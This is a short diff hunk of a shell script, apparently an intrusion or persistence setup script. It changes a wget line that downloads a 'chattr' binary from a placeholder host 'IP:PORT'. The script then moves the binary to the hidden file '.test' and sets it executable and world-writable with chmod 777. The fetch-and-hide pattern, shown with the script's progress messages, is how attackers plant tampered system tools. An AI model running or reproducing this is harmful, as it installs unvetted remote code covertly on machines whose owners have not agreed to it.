@@ -27,7 +27,7 @@ else
 	echo "getting your chattr file...."
 	echo "working port 1111"
 	sleep 3
-	wget http://IP:PORT/chattr_Binary/chattr 
+	wget http://IP:PORT/chattr 
 	mv chattr .test
 	chmod +x .test
 	chmod 777 .test
